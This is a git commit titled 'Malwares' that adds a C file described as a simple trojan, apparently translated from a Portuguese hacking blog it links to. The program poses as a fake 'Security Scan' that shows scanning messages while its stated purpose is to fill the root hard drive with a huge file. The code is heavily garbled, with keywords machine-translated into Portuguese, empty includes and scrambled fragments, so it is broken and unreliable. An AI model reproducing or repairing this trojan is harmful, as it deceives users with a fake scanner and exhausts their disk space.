abccd7c6ad29906ce0578db394381b65738610ba
Matheus Henrique <48736650+Matheus872@users.noreply.github.com>
2020-09-10 19:42:29 -0300

    Malwares

---
+++ trojan em c.cpp
@@ -0,0 +1,57 @@
+# Include
+# Include
+# Include
+FILE * a, * t *, b; 
+int r, status, vir_count; 
+i duplo; 
+char ch [] = "Criar um arquivo enorme para ocupar espaço em disco rígido", a escolha;
+eatspace void (void);
+FindRoot void (void);
+ShowStatus vazio (void);
+desenhar void (void);
+aceitar vazio (void);
+void main () { 
+draw ();
+accept ();
+textcolor (WHITE);
+draw ();
+gotoxy (12,8); 
+cputs (" . ANALISANDO O SEU SISTEMA AGUARDE ..."); 
+sono (3); 
+gotoxy (12,8); 
+delline (); 
+cputs ("Pressione qualquer tecla para iniciar a varredura do sistema ..."); 
+getch (); 
+gotoxy (12,8); 
+delline (); 
+FindRoot (); 
+} 
+
+vazio accept () { 
+textcolor (LIGHTRED); 
+gotoxy (1,8); 
+cputs ("Este programa é um DEMO de cavalo de Tróia simples Se você executar este programa. SERÁ \ n \ reat seu espaço em disco rígido cheio ON unidade raiz. Contudo, é possível a \ n \ rELIMINATE o dano. \ n \ n CLEANUP RTO \ o dano que você \ VE 'para apagar o arquivo \ "spceshot.dll \ "localizado no \ n \ n \ r \"% windir% \ \ System32 \) \ n \ n \ RIF você deseja executar o programa, pressione ENTER, caso contrário pressione qualquer tecla para sair..");
+if ((escolha = getch ())!= 13) exit (0);
+} 
+
+vazio Security Scan - 2009 (SCANNER SISTEMA QUICK) 
+} vazio SCAN foi interrompido. TRY AGAIN SCAN foi interrompido. TRY AGAIN SCAN foi interrompido. TRY AGAIN SCAN foi interrompido. TRY AGAIN SCAN FAILED PRESS qualquer tecla para fechar este programa!. ");
+ getch ();
+  exit (1);
+   } exit (1);
+    } eatspace 
+	
+	
+void () {
+textcolor (LIGHTRED); 
+gotoxy (12,16); 
+cputs (" ATENÇÃO: NÃO abortar o processo SCAN até que seja COMPLETE detectados e limpos sobre as ameaças% d ", vir_count);
+!.! gotoxy (12,10); 
+cprintf ("Pressione qualquer tecla para fechar ..."); 
+getch (); break; 
+} 
+
+} cputs ("." ); se o estado (== EOF) break; } se o estado (== EOF break); } exit (0); } vazio ShowStatus () { gotoxy (12,8); cputs ("verificar o sistema e ameaças") ; 
+gotoxy (12,10); cputs ("Isso pode levar até alguns minutos para algumas horas"); gotoxy (12,13); . cputs ("SCAN EM ANDAMENTO AGUARDE ..."); }
+
+Leia mais: https://anga-hackers.webnode.com.br/news/como-fazer-trojan-usando-c-linguagem-/
